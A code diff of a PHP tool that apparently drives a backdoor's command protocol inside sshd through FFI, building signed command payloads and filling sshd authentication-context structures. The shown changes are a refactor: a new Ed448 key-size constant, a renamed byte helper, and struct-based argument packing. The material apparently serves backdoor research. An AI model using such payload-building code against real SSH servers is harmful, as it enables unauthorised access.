@@ -17,6 +17,7 @@ require_once __DIR__ . '/vendor/autoload.php';
 define('CHACHA20_KEY_SIZE', 32);
 define('CHACHA20_IV_SIZE', 16);
 define('SHA256_DIGEST_SIZE', 32);
+define('ED448_PUBKEY_SIZE', 57);
 
 define('OP_ENCRYPT', 0);
 define('OP_DECRYPT', 1);
@@ -64,11 +65,10 @@ function make_array(int $size){
     return FFI::new($arrT);
 }
 
-function array_bytes(CData $arr_instance){
-    $size = FFI::sizeof($arr_instance);
-    return FFI::string(FFI::addr($arr_instance), $size);
+function cdata_bytes(CData $object){
+    $size = FFI::sizeof($object);
+    return FFI::string(FFI::addr($object), $size);
 }
-
 
 class Invoker {
     private FFI $ffi;
@@ -150,7 +150,7 @@ class Invoker {
         $this->nat_sshd_ctx->have_mm_answer_authpassword = 1;
         $this->nat_sshd_ctx->have_mm_answer_keyverify = 1;
 
-        $this->nat_ctx->num_shifted_bits = 57 * 8;
+        $this->nat_ctx->num_shifted_bits = ED448_PUBKEY_SIZE * 8;
         $this->nat_ctx->imported_funcs = FFI::addr($this->nat_imported_funcs);
         $this->nat_ctx->libc_imports = FFI::addr($this->nat_libc_imports);
         $this->nat_ctx->sshd_log_ctx = FFI::addr($this->nat_sshd_log_ctx);
@@ -278,7 +278,7 @@ class Invoker {
             error("rsa_key_hash FAILED");
             die;
         }
-        $this->ssh_hostkey_digest = array_bytes($buf);
+        $this->ssh_hostkey_digest = cdata_bytes($buf);
     }
 
     private function payload_make_header(int $cmd_type){
@@ -286,12 +286,12 @@ class Invoker {
     }
 
     private function payload_make_args(int $flags1, int $flags2, int $flags3, int $size_field){
-        return (''
-            . encode_data(1, $flags1)
-            . encode_data(1, $flags2)
-            . encode_data(1, $flags3)
-            . encode_data(2, $size_field)
-        );
+        $args = $this->ffi->new('cmd_arguments_t');
+        $args->flags1 = $flags1;
+        $args->flags2 = $flags2;
+        $args->flags3 = $flags3;
+        $args->u->size = $size_field;
+        return cdata_bytes($args);
     }
 
     private function payload_make_signature(int $cmd_type, string $packet){
